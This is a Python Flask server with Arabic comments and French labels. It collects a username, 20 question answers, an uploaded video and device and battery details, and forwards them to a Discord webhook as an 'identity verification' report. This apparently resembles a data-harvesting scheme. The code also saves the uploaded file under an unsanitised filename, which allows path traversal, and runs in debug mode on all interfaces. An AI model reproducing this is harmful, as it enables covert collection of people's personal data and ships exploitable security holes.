from flask import Flask, render_template, request, jsonify
import os
import requests
import json

app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# سحب رابط الـ Webhook من البيئة في Render أو وضعه مباشرة هنا
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "YOUR_DISCORD_WEBHOOK_URL_HERE")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit-consent', methods=['POST'])
def submit_consent():
    try:
        username = request.form.get('username', 'Utilisateur Anonyme')
        device_json = request.form.get('device', '{}')
        
        # جمع أجوبة الأسئلة الـ 20
        answers_summary = ""
        for i in range(1, 21):
            ans = request.form.get(f'q{i}')
            if ans:
                answers_summary += f"Q{i}: {ans} | "

        # تحميل الفيديو المؤقت
        video_file = request.files.get('video')
        file_path = None
        
        if video_file:
            file_path = os.path.join(UPLOAD_FOLDER, video_file.filename)
            video_file.save(file_path)

        # تجهيز الرسالة المرسلة لـ Discord
        device_data = json.loads(device_json)
        device_str = "\n".join([f"• **{k}**: {v}" for k, v in device_data.items()])
        
        message_content = (
            f"🚨 **Rapport de Vérification d'Identité** 🚨\n"
            f"👤 **Nom:** {username}\n\n"
            f"📋 **Réponses aux questions:**\n{answers_summary}\n\n"
            f"💻 **Informations de l'appareil & Batterie:**\n{device_str}"
        )

        # إرسال البيانات إلى ديسكورد
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                response = requests.post(
                    DISCORD_WEBHOOK_URL,
                    data={"content": message_content},
                    files={"file": f}
                )
            os.remove(file_path) # تنظيف الملف المحلي
        else:
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                json={"content": message_content}
            )

        if response.status_code in [200, 204]:
            return jsonify({"status": "success", "message": "Envoyé avec succès sur Discord"})
        else:
            return jsonify({"status": "error", "message": "Erreur Discord"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
